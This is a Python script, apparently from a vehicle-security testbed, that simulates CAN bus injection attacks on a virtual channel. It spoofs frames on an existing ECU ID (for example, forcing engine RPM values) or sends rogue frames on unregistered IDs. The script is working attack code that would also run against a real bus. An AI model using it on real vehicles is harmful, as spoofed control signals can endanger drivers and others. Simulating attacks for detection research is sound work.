#!/usr/bin/env python3
"""
Message injection attack simulation.

Unlike replay (resending a captured frame verbatim), injection fabricates
NEW frames without needing to have observed real traffic first. This
models an attacker who has reverse-engineered (or guessed) the bus
schema and crafts malicious payloads directly.

Two modes:
  spoof  - inject frames on an EXISTING ID with attacker-chosen values,
           colliding with/overriding the legitimate ECU's signal
           (e.g. forcing engine RPM to an implausible fixed value)
  rogue  - inject frames on an ID that never appears in normal traffic,
           simulating a compromised ECU or a bus-scanning/fuzzing probe
"""
import argparse
import struct
import time

import can


def spoof(bus, target_id, value, count, interval):
    """Repeatedly send a fixed, attacker-chosen 16-bit value on target_id."""
    data = struct.pack(">H6x", value)
    print(f"[inject:spoof] target=0x{target_id:03X}  value={value}  "
          f"count={count}  interval={interval}s")
    for i in range(count):
        msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
        bus.send(msg)
        print(f"[inject:spoof] sent {i + 1}/{count}: {data.hex()}")
        time.sleep(interval)


def rogue(bus, target_id, count, interval):
    """Send frames on an ID that shouldn't exist on this bus at all."""
    print(f"[inject:rogue] target=0x{target_id:03X} (unregistered ID)  "
          f"count={count}  interval={interval}s")
    for i in range(count):
        data = bytes([0xDE, 0xAD, i % 256, 0x00, 0x00, 0x00, 0x00, 0x00])
        msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
        bus.send(msg)
        print(f"[inject:rogue] sent {i + 1}/{count}: {data.hex()}")
        time.sleep(interval)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--channel", default="vcan0")
    ap.add_argument("--mode", choices=["spoof", "rogue"], required=True)
    ap.add_argument("--id", type=lambda x: int(x, 0), default=0x100,
                     help="target CAN ID (existing ID for spoof, new ID for rogue)")
    ap.add_argument("--value", type=int, default=0,
                     help="spoof mode only: fixed 16-bit value to inject, e.g. 0 or 8000")
    ap.add_argument("--count", type=int, default=20)
    ap.add_argument("--interval", type=float, default=0.05,
                     help="seconds between injected frames")
    args = ap.parse_args()

    total_duration = args.count * args.interval
    print(f"[plan] mode={args.mode}  frames={args.count}  "
          f"expected duration≈{total_duration:.1f}s\n")

    bus = can.Bus(interface="socketcan", channel=args.channel)
    try:
        if args.mode == "spoof":
            spoof(bus, args.id, args.value, args.count, args.interval)
        else:
            rogue(bus, args.id, args.count, args.interval)
    finally:
        bus.shutdown()

    print(f"\n[done] injected {args.count} frames in ~{total_duration:.1f}s")


if __name__ == "__main__":
    main()
